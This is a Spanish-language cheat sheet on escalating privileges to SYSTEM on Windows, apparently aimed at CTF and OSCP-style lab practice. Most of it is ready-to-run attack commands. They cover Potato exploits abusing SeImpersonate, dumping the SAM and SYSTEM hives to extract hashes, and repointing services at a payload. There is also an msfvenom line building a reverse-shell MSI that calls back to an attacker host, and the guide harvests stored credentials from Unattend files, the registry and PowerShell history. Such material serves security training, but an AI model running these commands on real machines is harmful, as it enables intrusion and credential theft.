# Escalada de Privilegios en Windows

Tienes una shell como usuario sin privilegios en Windows y quieres llegar a **`NT AUTHORITY\SYSTEM`** (el equivalente a root). La lógica es la misma que en Linux: **enumerar bien**. Windows añade sus propias joyas: tokens, servicios mal configurados y los *Potato attacks*.

> **Lo primero:** `whoami /priv` y lanza **winPEAS.exe** mientras revisas a mano las vías de abajo.

---

## Enumeración inicial

```cmd
whoami
whoami /priv              # ¡CLAVE! privilegios del token
whoami /groups
systeminfo                # versión, parches (hotfixes), arquitectura
hostname
net user                  # usuarios locales
net user <usuario>        # detalle de un usuario
net localgroup administrators
ipconfig /all
```

PowerShell:

```powershell
Get-LocalUser
Get-LocalGroupMember Administrators
```

Enumeración automática:

```powershell
# winPEAS (consigue el .exe o .bat en la máquina y ejecútalo)
.\winPEASx64.exe

# PowerUp (PowerShell)
powershell -ep bypass
. .\PowerUp.ps1 ; Invoke-AllChecks
```

---

## Vía 1 — Privilegios del token (`whoami /priv`)

Ciertos privilegios permiten escalar directamente a SYSTEM:

| Privilegio | Explotación |
| ---------- | ----------- |
| **SeImpersonatePrivilege** | *Potato attacks* (el caso más común en servidores web/IIS/MSSQL). |
| **SeAssignPrimaryToken** | Igual que el anterior (Potatoes). |
| **SeBackupPrivilege** | Leer cualquier fichero (copiar SAM/SYSTEM → extraer hashes). |
| **SeRestorePrivilege** | Escribir cualquier fichero (sobrescribir binarios/servicios). |
| **SeTakeOwnership** | Apropiarte de ficheros/claves protegidas. |
| **SeDebugPrivilege** | Volcar memoria de procesos (LSASS → credenciales). |
| **SeLoadDriver** | Cargar un driver vulnerable. |

### SeImpersonate → Potato attacks

Si tienes `SeImpersonatePrivilege` (típico de cuentas de servicio como `iis apppool`, `mssql`), usa un *Potato*:

```cmd
# PrintSpoofer (moderno y fiable)
PrintSpoofer.exe -i -c cmd

# GodPotato (muy compatible con versiones recientes)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato / RoguePotato (sistemas más antiguos)
```

> Si has entrado por una web/IIS, MSSQL o similar, **lo primero** es mirar `whoami /priv`: si ves `SeImpersonate`, un Potato te da SYSTEM casi gratis.

### SeBackup → robar hashes

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# descarga ambos y extrae hashes:
# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## Vía 2 — Servicios mal configurados

### Permisos débiles del servicio

Si puedes reconfigurar un servicio que corre como SYSTEM, apúntalo a tu payload:

```cmd
# Ver permisos de servicios (con accesschk de Sysinternals)
accesschk.exe /accepteula -uwcqv <usuario> *
sc qc <servicio>

# Reconfigurar el binario del servicio
sc config <servicio> binPath= "C:\Windows\Temp\rev.exe"
sc stop <servicio> & sc start <servicio>
```

### Unquoted Service Path (ruta sin comillas)

Si la ruta del binario tiene **espacios y no está entre comillas**, Windows prueba rutas intermedias. Si puedes escribir en una de ellas, colocas tu payload:

```cmd
# Buscar servicios con ruta sin comillas
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
```

Ruta `C:\Program Files\Some Dir\service.exe` → Windows intenta `C:\Program.exe`, `C:\Program Files\Some.exe`… Coloca `Some.exe` si tienes escritura.

### Binario o carpeta del servicio escribible

Si puedes sobrescribir el `.exe` del servicio o un DLL que carga → reemplázalo por tu payload y reinicia el servicio.

---

## Vía 3 — AlwaysInstallElevated

Si estas dos claves están a `1`, cualquier `.msi` se instala como SYSTEM:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Si ambas valen 1:

```bash
# Generar el MSI malicioso (en tu máquina)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f msi -o evil.msi
```

```cmd
# En la víctima
msiexec /quiet /qn /i evil.msi
```

---

## Vía 4 — Credenciales guardadas

```cmd
# Ficheros de respuesta de instalación (contraseñas en claro)
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml

# Credenciales guardadas de Windows
cmdkey /list
runas /savecred /user:admin cmd.exe

# Registro: autologon, PuTTY, VNC
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# Historial de PowerShell
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Busca ficheros con credenciales:

```powershell
findstr /si password *.txt *.ini *.config *.xml
Get-ChildItem -Recurse -Include *.config,*.xml,*.txt | Select-String "password"
```

---

## Vía 5 — Exploits de sistema (parches)

Compara `systeminfo` con los exploits conocidos:

```bash
# En tu máquina, con la salida de systeminfo guardada
windows-exploit-suggester.py --database xlsx --systeminfo systeminfo.txt
# o la versión next-gen:
wesng  # wes.py systeminfo.txt
```

Clásicos: **PrintNightmare** (CVE-2021-34527), **HiveNightmare/SeriousSAM** (CVE-2021-36934), **MS16-032**, exploits de kernel según build.

---

## Checklist de escalada Windows

- [ ] `whoami /priv` → ¿SeImpersonate/SeBackup/SeDebug/…?
- [ ] ¿SeImpersonate? → PrintSpoofer / GodPotato (SYSTEM casi seguro)
- [ ] Servicios: permisos débiles, unquoted path, binario escribible
- [ ] AlwaysInstallElevated (ambas claves a 1)
- [ ] Credenciales: Unattend.xml, cmdkey, registro, historial PS
- [ ] Tareas programadas (`schtasks /query /fo LIST /v`)
- [ ] `systeminfo` → windows-exploit-suggester / wesng
- [ ] Aplicaciones de terceros vulnerables instaladas

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `winPEAS` | Enumeración automática de escalada en Windows. |
| `PowerUp.ps1` | Comprobaciones de escalada en PowerShell. |
| `PrintSpoofer` / `GodPotato` / `JuicyPotato` | Abuso de SeImpersonate → SYSTEM. |
| `accesschk.exe` | Auditar permisos de servicios y ficheros (Sysinternals). |
| `windows-exploit-suggester` / `wesng` | Sugerir exploits según `systeminfo`. |
| `winPEAS`/`seatbelt` | Recolección de información del sistema. |

---

> **Consejo:** en Windows, `whoami /priv` es el equivalente a `sudo -l`. Si entraste por un servicio (IIS, MSSQL) y ves `SeImpersonatePrivilege`, ve directo a PrintSpoofer/GodPotato: resuelve la gran mayoría de escaladas en servidores. Si eres un usuario de escritorio normal, céntrate en servicios mal configurados y credenciales guardadas.

---

## Dónde practicar la escalada en Windows

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| TryHackMe — "Windows PrivEsc" / "Windows PrivEsc Arena" | Salas guiadas | https://tryhackme.com |
| LOLBAS | Referencia de binarios nativos abusables | https://lolbas-project.github.io |
| HTB — máquinas Windows retiradas | Online | https://www.hackthebox.com |
| Proving Grounds (Offensive Security) | "OSCP-like" | https://www.offsec.com/labs/ |

## Mini-writeup: escalada por SeImpersonate (Potato)

```flow
Enumerar :: whoami /priv muestra SeImpersonatePrivilege habilitado.
Subir :: Transferir PrintSpoofer/GodPotato a la víctima.
Explotar :: Ejecutar el Potato para abrir una shell como SYSTEM.
```

```cmd
whoami /priv
:: SeImpersonatePrivilege  Enabled
PrintSpoofer.exe -i -c cmd
:: whoami -> nt authority\system
```

> **Consejo:** las cuentas de servicio (IIS, MSSQL) casi siempre tienen `SeImpersonatePrivilege`. Si entras por una web o una base de datos en Windows, lo PRIMERO es `whoami /priv`: si ves SeImpersonate, un Potato te da SYSTEM en segundos. Practícalo en las salas de *Windows PrivEsc* de TryHackMe.
